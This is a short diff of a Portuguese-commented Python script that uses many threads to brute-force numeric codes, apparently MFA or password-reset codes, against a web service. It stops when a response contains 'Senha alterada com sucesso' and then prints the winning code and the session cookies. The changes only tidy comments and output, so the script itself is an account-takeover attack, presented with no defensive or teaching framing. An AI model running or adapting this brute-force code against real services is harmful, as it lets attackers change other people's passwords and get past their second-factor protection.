@@ -1,7 +1,6 @@
 import threading
 import requests
 
-# Função que faz a requisição
 foundResponse = False
 numberFound = -1
 
@@ -10,8 +9,6 @@ numberFound = -1
 
 def fazer_requisicao(numberStart, numberEnd):
     print("criou - ", numberStart, " - ", numberEnd)
-    # session = requests.session()
-
     global foundResponse
     global numberFound
     
@@ -41,7 +38,7 @@ def fazer_requisicao(numberStart, numberEnd):
         find = response.text.find('Senha alterada com sucesso')
         if (find != -1 and sid != '3130303031'):
             print("achou")
-            print(f"Requisição para concluída com código de status {response.status_code} que possui mfa-code: {sid}, urlPostLogin2", response.cookies, response.content)
+            print(f"Requisição status = {response.status_code} que possui sid: {sid}, mais info:", response.cookies, response.content)
             foundResponse = True
             numberFound = sid
             number = sid
@@ -81,4 +78,5 @@ n = 100000
 
 
 createThreads(n, nthreads)
+
 
